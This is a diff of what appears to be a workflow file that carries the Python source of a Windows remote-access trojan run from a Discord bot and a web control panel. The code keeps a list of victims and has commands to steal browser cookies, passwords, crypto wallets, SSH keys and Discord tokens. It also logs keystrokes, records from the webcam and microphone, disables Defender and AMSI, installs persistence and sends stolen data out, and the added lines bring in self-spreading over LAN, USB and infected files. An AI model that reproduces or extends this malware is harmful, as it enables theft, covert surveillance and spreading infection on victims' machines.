-                          _send_input(_ki(0, code, K_UNI), _ki(0, code, K_UNI | K_UP))
-              except Exception: pass
-
-          def _in_worker():
-              while True:
-                  try: d = _in_q.get(timeout=1)
-                  except Exception: continue
-                  try: _do_input(d)
-                  except Exception: pass
-
-          def _mon_count():
-              try:
-                  with mss.mss() as s: return max(1, len(s.monitors) - 1)
-              except Exception: return 1
-
-          def _lan_ip():
-              try:
-                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                  s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
-              except Exception: return ""
-
-          def _grab_jpeg(mon=1, scale=0.5, q=55):
-              if not mss: return b""
-              try:
-                  with mss.mss() as s:
-                      mons = s.monitors
-                      idx = mon if 0 < mon < len(mons) else (1 if len(mons) > 1 else 0)
-                      mm = mons[idx]; raw = s.grab(mm)
-                      _web["bounds"] = (mm["left"], mm["top"], mm["width"], mm["height"])
-              except Exception: return b""
-              if np is not None and cv2 is not None:
-                  try:
-                      img = np.frombuffer(raw.raw, dtype=np.uint8).reshape(raw.height, raw.width, 4)[:, :, :3]
-                      img = np.ascontiguousarray(img)
-                      if abs(scale - 1.0) > 0.02:
-                          img = cv2.resize(img, None, fx=scale, fy=scale, interpolation=cv2.INTER_AREA)
-                      ok, buf = cv2.imencode(".jpg", img, [int(cv2.IMWRITE_JPEG_QUALITY), int(q)])
-                      return buf.tobytes() if ok else b""
-                  except Exception: pass
-              if Image:
-                  try:
-                      im = Image.frombytes("RGB", raw.size, raw.rgb)
-                      if abs(scale - 1.0) > 0.02:
-                          im = im.resize((max(1, int(im.width*scale)), max(1, int(im.height*scale))))
-                      b = io.BytesIO(); im.save(b, "JPEG", quality=int(q)); return b.getvalue()
-                  except Exception: pass
-              return b""
-
-          def _ws_send(payload, binary=False):
-              ws = _web.get("ws")
-              if not ws: return False
-              try:
-                  with _web["lock"]:
-                      ws.send(payload, opcode=0x2 if binary else 0x1)
-                  return True
-              except Exception: return False
-
-          def _web_frames():
-              while True:
-                  try:
-                      _web["beat"] = time.time()
-                      if not _web["on"] or _web["viewers"] <= 0:
-                          time.sleep(0.05); continue
-                      t = time.time()
-                      jpg = _grab_jpeg(WEB_MON, WEB_SCALE, WEB_QUALITY)
-                      if jpg: _ws_send(jpg, True)
-                      wait = (1.0 / max(WEB_FPS, 1)) - (time.time() - t)
-                      if wait > 0: time.sleep(wait)
-                  except Exception:
-                      time.sleep(0.1)
-
-          WEB_HELP = (
-              "help | sysinfo | procs | drives | env | users | services | startup | schedule | uptime | battery | gpu | av | installed | vm | sandbox\n"
-              "sh <cmd> | ps1 <cmd> | ls [dir] | cat <file> | tree <dir> | du <dir> | search <ten> | del <path> | mkdir <path>\n"
-              "shot | cam | record [giay] | mic [giay] | download <path> | zip <path>\n"
-              "wifi | net | ports | arp | dns | speedtest | reconnect | ping <host> | dl <url> <path>\n"
-              "browser | cookies | autofill | wallets | apps | files | ssh | cloud | vault | keepass | dtoken | steal | grab | pending\n"
-              "clip [text] | type <text> | keylog on|off|dump | cliplog on|off|dump | speak <text> | msg <text> | notify <text>\n"
-              "wall <url|path> | open <url|path> | power shutdown|restart|lock|sleep|logoff | kill <ten>\n"
-              "bypass | defender on|off | amsi <cmd> | etw | hide <path> | timestomp <path> | persist | glitch on|off\n"
-              "overlay <text> | fakebsod | rickroll | caps | desk | mute | volup [n] | voldown [n] | cd | flip | recycle\n"
-              "seturl <url> | reload | webhook <url> | exfil | eval <expr> | exec <code> | restart | huy")
-
-          def _local_cmd(name, args):
-              n = (name or "").lower().strip()
-              a = [str(x) for x in (args or [])]
-              j = " ".join(a)
-              if n in ("", "help", "?"): return WEB_HELP, None
-              if n in ("sh", "shell"): return _shell.run(j or "echo ok"), None
-              if n == "cmd": return run_cmd(j or "echo ok"), None
-              if n in ("ps1", "powershell"): return run_cmd('powershell -NoProfile -c "' + j + '"', 120), None
-              if n == "ls": return f_ls(j or "."), None
-              if n == "cat": return f_cat(j), None
-              if n == "tree": return f_tree(j or "."), None
-              if n == "du": return f_du(j), None
-              if n == "hex": return f_hex(j), None
-              if n == "search": return f_search(j or "svchost"), None
-              if n == "del": return f_del(j), None
-              if n == "mkdir": return f_mkdir(j), None
-              if n == "copy": return f_copy(a), None
-              if n == "move": return f_move(a), None
-              if n == "rename": return f_rename(a), None
-              if n == "write": return f_write(a), None
-              if n == "zip": return f_zip(j or "."), None
-              if n == "sysinfo": return f_sysinfo(), None
-              if n in ("procs", "tasklist"): return f_ps(), None
-              if n == "kill": return f_kill(j), None
-              if n == "start": return f_start(j), None
-              if n == "power": return f_power(j or "lock"), None
-              if n == "drives": return f_drives(), None
-              if n == "env": return f_env(), None
-              if n == "users": return f_users(), None
-              if n == "services": return f_services(), None
-              if n == "startup": return f_startup(), None
-              if n == "schedule": return f_schedule(), None
-              if n == "uptime": return f_uptime(), None
-              if n == "battery": return f_battery(), None
-              if n == "gpu": return f_gpu(), None
-              if n == "av": return f_av(), None
-              if n == "installed": return f_installed(), None
-              if n == "vm": return f_vm(), None
-              if n == "sandbox": return f_sandbox(), None
-              if n == "bypass": return f_bypass(), None
-              if n == "defender": return f_defender(j or "status"), None
-              if n == "amsi": return f_amsi(j or "echo ok"), None
-              if n == "etw": return etw_patch(), None
-              if n == "timestomp": return f_timestomp(j or SCRIPT_PATH), None
-              if n == "hide": return f_hide(j), None
-              if n == "clone": return f_clone(j), None
-              if n == "recycle": return f_recycle(), None
-              if n == "seturl": return f_seturl(j), None
-              if n == "reload":
-                  _reconnect_ws(); return "dang ket noi lai: " + _control_base(), None
-              if n == "persist":
-                  install(); install_task(); return "✅ đã bật persist (task onlogon + guard 5 phút)", None
-              if n == "shot":
-                  p = f_screen(); return ("Đã chụp" if p else "lỗi"), p
-              if n == "cam":
-                  p = f_cam(); return ("Đã chụp cam" if p else "lỗi"), p
-              if n == "record":
-                  p = f_record(a[0] if a else 10); return ("Đã quay" if p else "lỗi"), p
-              if n == "mic":
-                  p = f_mic(a[0] if a else 5); return ("Đã ghi âm" if p else "lỗi"), p
-              if n == "download": return "file", os.path.expanduser(j)
-              if n == "grab": return "grab", f_grab()
-              if n == "steal": return "steal", f_steal()
-              if n == "wifi": return f_wifi(), None
-              if n == "net": return f_net(), None
-              if n == "ports": return f_ports(), None
-              if n == "arp": return f_arp(), None
-              if n == "dns": return f_dns(), None
-              if n == "speedtest": return f_speedtest(), None
-              if n == "reconnect": return f_reconnect(), None
-              if n == "ping": return f_ping(j or "8.8.8.8"), None
-              if n == "dl": return f_dl(a), None
-              if n == "browser": return f_browser(), None
-              if n == "cookies": return f_cookies(), None
-              if n == "autofill": return f_autofill(), None
-              if n == "history": return f_history(a[0] if a else 60), None
-              if n == "wallets": return f_wallets(), None
-              if n == "apps": return f_apps(), None
-              if n == "files": return f_files(j or "doc,docx,xls,xlsx,pdf,txt,ppt,pptx,key,pem,pfx,kdbx,ovpn,conf"), None
-              if n == "ssh": return f_ssh(), None
-              if n == "cloud": return f_cloud(), None
-              if n == "vault": return f_vault(), None
-              if n == "keepass": return f_keepass(), None
-              if n == "dtoken": return f_dtoken(), None
-              if n == "pending": return f_pending(), None
-              if n == "webhook": return f_webhook(j), None
-              if n == "exfil": return exfil(j or os.path.join(tempfile.gettempdir(), "steal.zip")), None
-              if n == "clip":
-                  return (f_clip_set(j) if a else f_clip_get()), None
-              if n == "type": return f_type(j), None
-              if n == "keylog": return f_keylog(a[0] if a else "dump"), None
-              if n == "cliplog": return f_cliplog(a[0] if a else "dump"), None
-              if n == "speak": return f_speak(j), None
-              if n == "play": return f_play(j), None
-              if n == "msg": return f_msg(j), None
-              if n == "notify": return f_notify(j), None
-              if n == "wall": return f_wall(j), None
-              if n == "open": return f_open(j), None
-              if n == "beep": return f_beep(), None
-              if n == "caps": return f_caps(), None
-              if n == "desk": return f_desk(), None
-              if n == "mute": return f_mute(), None
-              if n == "volup": return f_volup(a[0] if a else 5), None
-              if n == "voldown": return f_voldown(a[0] if a else 5), None
-              if n == "cd": return f_cd(), None
-              if n == "flip": return f_flip(), None
-              if n == "overlay": return f_overlay(j), None
-              if n == "fakebsod": return f_fakebsod(), None
-              if n == "rickroll": return f_rickroll(), None
-              if n == "glitch": return f_glitch(a[0] if a else "on"), None
-              if n == "lock": return f_lock(a), None
-              if n == "unlock": return f_unlock(a), None
-              if n == "blockinput": return f_blockinput(a[0] if a else "on"), None
-              if n == "critical": return f_critical(a[0] if a else "on"), None
-              if n == "bsod": return "BSOD...", None
-              if n == "eval": return f_eval(j), None
-              if n == "exec": return f_exec(j), None
-              if n == "restart": return "restart...", None
-              if n == "huy": return "tự hủy...", None
-              return f"Không có lệnh: {n} (gõ help)", None
-
-          _fetch_cache = {"ts": 0.0, "url": ""}
-
-          def _control_base():
-              global CONTROL_URL
-              if CONTROL_FETCH and requests:
-                  if time.time() - _fetch_cache["ts"] > 60:
-                      _fetch_cache["ts"] = time.time()
-                      try:
-                          t = (requests.get(CONTROL_FETCH, timeout=10).text or "").strip().splitlines()
-                          t = t[0].strip() if t else ""
-                          if t: _fetch_cache["url"] = t
-                      except Exception: pass
-                  if _fetch_cache["url"]: return _fetch_cache["url"]
-              try:
-                  if os.path.exists(URL_FILE):
-                      v = open(URL_FILE, encoding="utf-8").read().strip()
-                      if v: return v
-              except Exception: pass
-              return CONTROL_URL
-
-          def _reconnect_ws():
-              try:
-                  w = _web.get("ws")
-                  if w: w.close()
-              except Exception: pass
-
-          def f_seturl(u):
-              global CONTROL_URL
-              if not u: return f"URL = {_control_base()}"
-              CONTROL_URL = u.strip().rstrip("/")
-              try:
-                  with open(URL_FILE, "w", encoding="utf-8") as f: f.write(CONTROL_URL)
-              except Exception: pass
-              threading.Timer(0.5, _reconnect_ws).start()
-              return f"URL = {CONTROL_URL} (da luu vao control_url.txt, dang ket noi lai)"
-
-          def _ws_url():
-              u = (_control_base() or "").rstrip("/")
-              if u.startswith("https"): u = "wss" + u[5:]
-              elif u.startswith("http"): u = "ws" + u[4:]
-              return u + "/ws"
-
-          def _on_open(ws):
-              _web["ws"] = ws; _web["on"] = True
-              info = {"id": MACHINE_ID, "host": platform.node(),
-                      "user": os.environ.get("USERNAME", ""),
-                      "os": f"{platform.system()} {platform.release()}",
-                      "admin": is_admin(), "ip": _lan_ip(),
-                      "mons": _mon_count(), "ver": "svchost 2.1", "url": _control_base()}
-              try:
-                  ws.send(json.dumps({"t": "hello", "role": "agent",
-                                      "key": AGENT_KEY, "info": info}))
-              except Exception: pass
-
-          def _on_close(ws, *a):
-              _web["on"] = False; _web["ws"] = None; _web["viewers"] = 0
-
-          def c_huy_sync():
-              try: uninstall()
-              except Exception: pass
-              time.sleep(0.5)
-              subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
-                               shell=True, creationflags=NO_WIN)
-              os._exit(0)
-
-          def _on_msg(ws, msg):
-              if isinstance(msg, bytes): return
-              try: j = json.loads(msg)
-              except Exception: return
-              t = j.get("t")
-              if t == "viewers":
-                  try: _web["viewers"] = int(j.get("n", 0))
-                  except Exception: _web["viewers"] = 0
-              elif t == "set":
-                  global WEB_FPS, WEB_QUALITY, WEB_SCALE, WEB_MON, WEB_HIDDEN
-                  s = j.get("s", {}) or {}
-                  try:
-                      if "fps" in s: WEB_FPS = max(1, min(30, int(s["fps"])))
-                      if "q" in s: WEB_QUALITY = max(10, min(95, int(s["q"])))
-                      if "scale" in s: WEB_SCALE = max(0.2, min(1.0, float(s["scale"])))
-                      if "mon" in s: WEB_MON = max(1, min(_mon_count(), int(s["mon"])))
-                      if "hidden" in s: WEB_HIDDEN = bool(s["hidden"])
-                  except Exception: pass
-              elif t == "in":
-                  try: _in_q.put_nowait(j.get("d", {}))
-                  except queue.Full: pass
-              elif t == "cmd":
-                  rid = j.get("rid"); nm = j.get("name", ""); ar = j.get("args", [])
-                  def work(nm=nm, ar=ar, rid=rid):
-                      try: txt, fp = _local_cmd(nm, ar)
-                      except Exception as e: txt, fp = f"Lỗi: {e}", None
-                      _ws_send(json.dumps({"t": "cmdres", "rid": rid, "text": txt or ""}))
-                      if fp and os.path.exists(fp):
-                          try:
-                              data = open(fp, "rb").read()
-                              if len(data) <= 24 * 1024 * 1024:
-                                  _ws_send(json.dumps({"t": "file", "rid": rid,
-                                      "name": os.path.basename(fp), "size": len(data),
-                                      "b64": base64.b64encode(data).decode()}))
-                              else:
-                                  _ws_send(json.dumps({"t": "cmdres", "rid": rid,
-                                      "text": f"[file {human(len(data))} quá lớn để gửi web: {fp}]"}))
-                          except Exception as e:
-                              _ws_send(json.dumps({"t": "cmdres", "rid": rid, "text": f"Lỗi gửi file: {e}"}))
-                      if nm == "restart": f_restart()
-                      if nm == "huy": c_huy_sync()
-                  threading.Thread(target=work, daemon=True).start()
-
-          def _web_loop():
-              if not CONTROL_ON or not websocket: return
-              back = 3
-              while True:
-                  try:
-                      app = websocket.WebSocketApp(_ws_url(), on_open=_on_open,
-                              on_message=_on_msg, on_close=_on_close,
-                              on_error=lambda w, e: None)
-                      app.run_forever(ping_interval=20, ping_timeout=10,
-                                      sslopt={"cert_reqs": _ssl.CERT_NONE})
-                  except Exception as e:
-                      print("web lỗi:", e)
-                  _on_close(None)
-                  time.sleep(back); back = min(back + 2, 30)
+              except Exception as e: return f"Loi: {e}"
 
           # ============================================================
           #  VOICE
@@ -2182,7 +2042,7 @@ jobs:
                               pcm = (npx.clip(data, -1, 1) * 32767).astype(npx.int16).tobytes()
                               try: self.q.put_nowait(pcm)
                               except queue.Full: pass
-                  except Exception as e: print("voice lỗi:", e)
+                  except Exception as e: print("voice loi:", e)
               def read(self):
                   data = self.buf
                   while len(data) < 3840:
@@ -2205,99 +2065,84 @@ jobs:
 
           async def c_help(m, a):
               await m.channel.send(
-                  "**📋 LỆNH**\n"
-                  "**Đa máy:** `!list` `!select <số|ID>` `!back` `!sel` `!master` — hoặc `!all <lệnh>` / `!<ID> <lệnh>`\n"
-                  "**🌐 WEB:** `!web` `!seturl <url>` `!reload` `!webfps <n>` `!webq <n>` `!webscale <n>` `!hidden on|off`\n"
-                  "**🛡️ BYPASS:** `!bypass` `!defender off|on` `!amsi` `!etw` `!timestomp` `!hide` `!clone` `!sandbox` `!token`\n"
+                  "**LENH**\n"
+                  "**Da may:** `!list` `!select <so|ID>` `!back` `!sel` `!master` - hoac `!all <lenh>` / `!<ID> <lenh>`\n"
+                  "**PHAT TAN:** `!spread` (all) `!spread lan|usb|file|prog` `!lan [subnet]` `!usb` `!infect [dir] [max]` `!uninfect [dir]` `!programs` `!auto on|off` `!spreadinfo`\n"
+                  "**BYPASS:** `!bypass` `!defender off|on` `!amsi` `!etw` `!timestomp` `!hide` `!clone` `!sandbox` `!token`\n"
                   "**Shell:** `!sh` `!ps1` `!pwd` `!cddir` `!cmd`\n"
                   "**File:** `!ls !cat !write !mkdir !copy !move !rename !tree !du !hex !search !del !zip !merge !download !upload`\n"
-                  "**Hệ thống:** `!sysinfo !ps !kill !start !power !drives !env !users !services !startup !schedule !uptime !battery !gpu !av !installed !recycle !vm`\n"
+                  "**He thong:** `!sysinfo !ps !kill !start !power !drives !env !users !services !startup !schedule !uptime !battery !gpu !av !installed !recycle !vm`\n"
                   "**Media:** `!chupanh !chupmanhinh !monitors !record !camgif !mic !speak !play !open !beep !live on|off`\n"
                   "**Input:** `!keylog on|dump` `!cliplog on|dump` `!type !mouse !clip !caps !desk !mute !volup !voldown`\n"
                   "**Troll:** `!msg !notify !wall <url|path> !cd !flip !volume !overlay \"text\" !fakebsod !rickroll !glitch on|off`\n"
-                  "**Khóa máy:** `!blockinput on|off` `!critical on|off` `!bsod` `!lock <pass> [dir]` `!unlock <pass> [dir]`\n"
-                  "**Mạng:** `!wifi !net !ports !ping !arp !dns !dl !speedtest !reconnect`\n"
-                  "**🥷 STEAL:** `!steal !grab !browser !cookies !autofill !history !wallets !apps !files !ssh !cloud !vault !keepass !dtoken`\n"
+                  "**Khoa may:** `!blockinput on|off` `!critical on|off` `!bsod` `!lock <pass> [dir]` `!unlock <pass> [dir]`\n"
+                  "**Mang:** `!wifi !net !ports !ping !arp !dns !dl !speedtest !reconnect`\n"
+                  "**STEAL:** `!steal !grab !browser !cookies !autofill !history !wallets !apps !files !ssh !cloud !vault !keepass !dtoken`\n"
                   "**Exfil:** `!webhook <url>` `!exfil` `!pending`\n"
-                  "**Voice:** `!join` · `!join sys` · `!leave`\n"
-                  "**Khác:** `!eval !exec !update <url> [sha256] !rollback !restart !persist !id !huy`")
+                  "**Voice:** `!join` / `!join sys` / `!leave`\n"
+                  "**Khac:** `!eval !exec !update <url> [sha256] !rollback !restart !persist !id !huy`")
 
           async def c_list(m, a):
               regs = await _scan_regs(m.channel); sel = get_sel()
               now = time.time()
-              lines = ["**🖥️ Danh sách nạn nhân:**"]
+              lines = ["**Danh sach nan nhan:**"]
               for i, k in enumerate(sorted(regs.keys()), 1):
-                  r = regs[k]; mark = "🎯" if k == sel else "▫️"
-                  live = "" if now - r.get("seen", 0) <= FRESH else " 💀"
-                  lines.append(f"{mark} `{i}` · `{k}` — {r['host']} / {r['user']}{live}")
-              lines.append(f"\nĐang điều khiển: `{sel}` · chọn `!select <số>` · về tất cả `!back`")
+                  r = regs[k]; mark = ">>" if k == sel else "  "
+                  live = "" if now - r.get("seen", 0) <= FRESH else " [dead]"
+                  lines.append(f"{mark} `{i}` - `{k}` - {r['host']} / {r['user']}{live}")
+              lines.append(f"\nDang dieu khien: `{sel}` - chon `!select <so>` - ve tat ca `!back`")
               await m.channel.send("\n".join(lines))
 
           async def c_select(m, a):
-              if not a: return await m.channel.send(f"🎯 Đang chọn: `{get_sel()}`")
+              if not a: return await m.channel.send(f"Dang chon: `{get_sel()}`")
               regs = await _scan_regs(m.channel); ids = sorted(regs.keys()); key = a[0]
               if key.lower() == "all": target = "all"
               elif key.isdigit() and 1 <= int(key) <= len(ids): target = ids[int(key)-1]
               elif key in regs: target = key
-              else: return await m.channel.send("❌ Không tìm thấy. Dùng `!list`")
+              else: return await m.channel.send("Khong tim thay. Dung `!list`")
               set_sel(target)
-              await m.channel.send(f"🎯 Đã chọn: `{target}`")
+              await m.channel.send(f"Da chon: `{target}`")
 
           async def c_back(m, a):
-              set_sel("all"); await m.channel.send("↩️ Quay lại điều khiển TẤT CẢ nạn nhân")
+              set_sel("all"); await m.channel.send("Quay lai dieu khien TAT CA")
 
-          async def c_sel(m, a): await m.channel.send(f"🎯 Đang chọn: `{get_sel()}`")
+          async def c_sel(m, a): await m.channel.send(f"Dang chon: `{get_sel()}`")
 
           async def c_master(m, a):
               regs = await _scan_regs(m.channel)
               now = time.time()
               live = sorted(k for k, v in regs.items() if now - v.get("seen", 0) <= FRESH)
-              await m.channel.send(f"👑 Master (sống): `{live[0]}` · bạn là master: {MACHINE_ID == live[0]}")
+              await m.channel.send(f"Master (song): `{live[0]}` - ban la master: {MACHINE_ID == live[0]}")
 
-          async def c_web(m, a):
-              await m.channel.send(
-                  f"🌐 **Web control:** {_control_base()}\n"
-                  f"Trạng thái: {'✅ đã kết nối' if _web['on'] else '❌ chưa kết nối'}\n"
-                  f"Người đang xem: {_web['viewers']}\n"
-                  f"FPS {WEB_FPS} · Quality {WEB_QUALITY} · Scale {WEB_SCALE} · Màn {WEB_MON} · Chuột ẩn {'ON' if WEB_HIDDEN else 'OFF'}\n"
-                  f"Máy: `{MACHINE_ID}` — mở web, chọn máy này ở danh sách bên trái.")
-
-          async def c_seturl(m, a): await m.channel.send(await ex(f_seturl, " ".join(a)))
-          async def c_reload(m, a):
-              await ex(_reconnect_ws); await m.channel.send(f"🔄 đang kết nối lại: {_control_base()}")
-
-          async def c_webfps(m, a):
-              global WEB_FPS
-              if a:
-                  try: WEB_FPS = max(1, min(30, int(a[0])))
-                  except Exception: pass
-              await m.channel.send(f"FPS = {WEB_FPS}")
-          async def c_webq(m, a):
-              global WEB_QUALITY
-              if a:
-                  try: WEB_QUALITY = max(10, min(95, int(a[0])))
-                  except Exception: pass
-              await m.channel.send(f"Quality = {WEB_QUALITY}")
-          async def c_webscale(m, a):
-              global WEB_SCALE
-              if a:
-                  try: WEB_SCALE = max(0.2, min(1.0, float(a[0])))
-                  except Exception: pass
-              await m.channel.send(f"Scale = {WEB_SCALE}")
-          async def c_hidden(m, a):
-              global WEB_HIDDEN
+          # ---- phat tan ----
+          async def c_spread(m, a):
+              await m.channel.send("Dang phat tan...")
+              await send_long(m, await ex(f_spread, a[0] if a else "all"))
+          async def c_lan(m, a):
+              await m.channel.send("Dang quet LAN (co the 1-2 phut)...")
+              await send_long(m, await ex(spread_lan, a[0] if a else ""))
+          async def c_usb(m, a):    await m.channel.send(await ex(spread_usb))
+          async def c_infect(m, a):
+              await send_long(m, await ex(f_infect, a[0] if a else "", a[1] if len(a) > 1 else 25))
+          async def c_uninfect(m, a): await send_long(m, await ex(f_uninfect, a[0] if a else ""))
+          async def c_programs(m, a):
+              r = await ex(spread_programs)
+              await send_long(m, "Da tha vao:\n" + "\n".join(r))
+          async def c_spreadinfo(m, a): await send_long(m, await ex(f_spreadinfo))
+          async def c_auto(m, a):
               s = (a[0].lower() if a else "on")
-              WEB_HIDDEN = s in ("on","1","true","yes")
-              await m.channel.send(f"Chuột ẩn = {'ON' if WEB_HIDDEN else 'OFF'}")
+              AUTO_SPREAD[0] = s in ("on", "1", "true", "yes")
+              await m.channel.send(f"Auto spread = {'ON' if AUTO_SPREAD[0] else 'OFF'}")
 
+          # ---- shell / file ----
           async def c_cmd(m, a): await send_long(m, await ex(run_cmd, " ".join(a) or "echo hello"))
           async def c_sh(m, a):
               raw = _RAW.get(m.id, " ".join(a))
               if not raw: return await m.channel.send(f"cwd: {_shell.cwd}")
               await send_long(m, await ex(_shell.run, raw))
-          async def c_pwd(m, a): await m.channel.send(f"📂 {_shell.cwd}")
+          async def c_pwd(m, a): await m.channel.send(f"{_shell.cwd}")
           async def c_cddir(m, a):
-              await ex(_shell.run, "cd /d " + " ".join(a)); await m.channel.send(f"📂 {_shell.cwd}")
+              await ex(_shell.run, "cd /d " + " ".join(a)); await m.channel.send(f"{_shell.cwd}")
           async def c_ps1(m, a):
               await send_long(m, await ex(run_cmd, 'powershell -NoProfile -c "' + " ".join(a) + '"', 120))
 
@@ -2315,6 +2160,7 @@ jobs:
           async def c_del(m, a):     await m.channel.send(await ex(f_del, " ".join(a)))
           async def c_merge(m, a):   await m.channel.send(await ex(f_merge, a))
 
+          # ---- he thong ----
           async def c_sysinfo(m, a): await send_long(m, await ex(f_sysinfo))
           async def c_ps(m, a):      await send_long(m, await ex(f_ps))
           async def c_kill(m, a):    await m.channel.send(await ex(f_kill, " ".join(a)))
@@ -2339,7 +2185,7 @@ jobs:
           async def c_amsi(m, a):
               await send_long(m, await ex(f_amsi, _RAW.get(m.id, " ".join(a)) or "echo ok"))
           async def c_etw(m, a):      await m.channel.send(await ex(etw_patch))
-          async def c_token(m, a):    await m.channel.send(f"🔑 `{_token()[:40]}...`")
+          async def c_token(m, a):    await m.channel.send(f"`{_token()[:40]}...`")
           async def c_timestomp(m, a):await m.channel.send(await ex(f_timestomp, " ".join(a) or SCRIPT_PATH))
           async def c_hide(m, a):     await m.channel.send(await ex(f_hide, " ".join(a)))
           async def c_clone(m, a):    await m.channel.send(await ex(f_clone, " ".join(a)))
@@ -2355,24 +2201,24 @@ jobs:
           async def c_play(m, a):    await m.channel.send(await ex(f_play, " ".join(a)))
 
           async def c_chupanh(m, a):
-              await m.channel.send("📷 ..."); p = await ex(f_cam)
-              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌")
+              await m.channel.send("..."); p = await ex(f_cam)
+              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("XX")
           async def c_chupmanhinh(m, a):
-              await m.channel.send("🖼️ ..."); p = await ex(f_screen)
-              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌")
+              await m.channel.send("..."); p = await ex(f_screen)
+              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("XX")
           async def c_monitors(m, a):
               ps = await ex(f_monitors)
-              if not ps: return await m.channel.send("❌")
+              if not ps: return await m.channel.send("XX")
               for p in ps: await m.channel.send(file=discord.File(p))
           async def c_record(m, a):
-              await m.channel.send("🎬 ..."); p = await ex(f_record, a[0] if a else 10)
-              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌")
+              await m.channel.send("..."); p = await ex(f_record, a[0] if a else 10)
+              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("XX")
           async def c_camgif(m, a):
-              await m.channel.send("📷 ..."); p = await ex(f_camgif)
-              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌")
+              await m.channel.send("..."); p = await ex(f_camgif)
+              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("XX")
           async def c_mic(m, a):
-              await m.channel.send("🎤 ..."); p = await ex(f_mic, a[0] if a else 5)
-              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("❌")
+              await m.channel.send("..."); p = await ex(f_mic, a[0] if a else 5)
+              await m.channel.send(file=discord.File(p)) if p else await m.channel.send("XX")
           async def c_speak(m, a):   await m.channel.send(await ex(f_speak, " ".join(a)))
           async def c_beep(m, a):    await m.channel.send(await ex(f_beep))
 
@@ -2384,16 +2230,16 @@ jobs:
                   if p:
                       try:
                           if msg is None:
-                              msg = await ch.send("🔴 live", file=discord.File(p, filename="live.png"))
+                              msg = await ch.send("live", file=discord.File(p, filename="live.png"))
                           else:
                               await msg.edit(attachments=[discord.File(p, filename="live.png")])
                       except Exception: pass
                   await asyncio.sleep(2)
           async def c_live(m, a):
               s = (a[0].lower() if a else "on")
-              if s == "off": _live[0] = False; return await m.channel.send("⏹️ live off")
-              if _live[0]: return await m.channel.send("đang live")
-              _live[0] = True; await m.channel.send("🔴 live on (2s/frame)")
+              if s == "off": _live[0] = False; return await m.channel.send("live off")
+              if _live[0]: return await m.channel.send("dang live")
+              _live[0] = True; await m.channel.send("live on (2s/frame)")
               asyncio.ensure_future(_live_loop(m.channel))
 
           async def c_keylog(m, a):  await send_long(m, await ex(f_keylog, a[0] if a else "dump"))
@@ -2427,18 +2273,18 @@ jobs:
           async def c_cd(m, a):      await m.channel.send(await ex(f_cd))
           async def c_flip(m, a):    await m.channel.send(await ex(f_flip))
           async def c_volume(m, a):  await m.channel.send(await ex(f_volume, a))
-          async def c_bsod(m, a):    await m.channel.send("💥 BSOD...")
-          async def c_id(m, a):      await m.channel.send(f"🆔 `{MACHINE_ID}`")
+          async def c_bsod(m, a):    await m.channel.send("BSOD...")
+          async def c_id(m, a):      await m.channel.send(f"`{MACHINE_ID}`")
           async def c_persist(m, a):
               await ex(install); await ex(install_task); await ex(f_bypass)
-              await m.channel.send("✅ persist (task onlogon + guard 5 phút) + bypass xong")
-          async def c_restart(m, a): await m.channel.send("♻️ Restart..."); await ex(f_restart)
+              await m.channel.send("persist + bypass xong")
+          async def c_restart(m, a): await m.channel.send("Restart..."); await ex(f_restart)
 
           async def c_grab(m, a):
-              await m.channel.send("📦 ..."); p = await ex(f_grab)
+              await m.channel.send("..."); p = await ex(f_grab)
               await _send_file(m.channel, p, f"grab_{MACHINE_ID}.zip")
           async def c_steal(m, a):
-              await m.channel.send("🥷 steal..."); p = await ex(f_steal)
+              await m.channel.send("steal..."); p = await ex(f_steal)
               await _send_file(m.channel, p, f"steal_{MACHINE_ID}.zip")
               if WEBHOOK: await m.channel.send(await ex(exfil, p, "full steal"))
           async def c_browser(m, a): await send_long(m, await ex(f_browser))
@@ -2460,20 +2306,20 @@ jobs:
 
           async def c_download(m, a):
               path = os.path.expanduser(" ".join(a))
-              if not os.path.exists(path): return await m.channel.send(f"❌ {path}")
+              if not os.path.exists(path): return await m.channel.send(f"XX {path}")
               if os.path.isdir(path):
                   p = await ex(f_zip, path); return await _send_file(m.channel, p, "folder.zip")
               await _send_file(m.channel, path)
           async def c_zip(m, a):
               p = await ex(f_zip, " ".join(a) or "."); await _send_file(m.channel, p, "dump.zip")
           async def c_upload(m, a):
-              if not m.attachments: return await m.channel.send("❌ Kèm file")
+              if not m.attachments: return await m.channel.send("Kem file")
               for at in m.attachments: await at.save(os.path.join(LOOT_DIR, at.filename))
-              await m.channel.send(f"✅ nhận {len(m.attachments)} file")
+              await m.channel.send(f"nhan {len(m.attachments)} file")
           async def c_update(m, a):
-              await m.channel.send("🔄 ..."); await m.channel.send(str(await ex(f_update, a)) or "đang cập nhật...")
+              await m.channel.send("..."); await m.channel.send(str(await ex(f_update, a)) or "dang cap nhat...")
           async def c_rollback(m, a):
-              await m.channel.send("↩️ rollback..."); await m.channel.send(str(await ex(f_rollback)))
+              await m.channel.send("rollback..."); await m.channel.send(str(await ex(f_rollback)))
 
           async def c_eval(m, a): await send_long(m, await ex(f_eval, _RAW.get(m.id, " ".join(a))))
           async def c_exec(m, a): await send_long(m, await ex(f_exec, _RAW.get(m.id, " ".join(a))))
@@ -2481,7 +2327,7 @@ jobs:
           async def c_join(m, a):
               global _vc, _src
               vs = getattr(m.author, "voice", None)
-              if not vs or not vs.channel: return await m.channel.send("❌ Vào voice trước")
+              if not vs or not vs.channel: return await m.channel.send("Vao voice truoc")
               ch = vs.channel
               if _vc and _vc.is_connected(): await _vc.move_to(ch)
               else: _vc = await ch.connect()
@@ -2489,15 +2335,15 @@ jobs:
               if kind not in ("mic","sys"): kind = "mic"
               if _src: _src.running = False
               _src = StreamSource(kind); _vc.play(_src)
-              await m.channel.send(f"🔊 `{ch.name}` — {kind}")
+              await m.channel.send(f"`{ch.name}` - {kind}")
           async def c_leave(m, a):
               global _vc, _src
               if _src: _src.running = False
               if _vc and _vc.is_connected(): await _vc.disconnect()
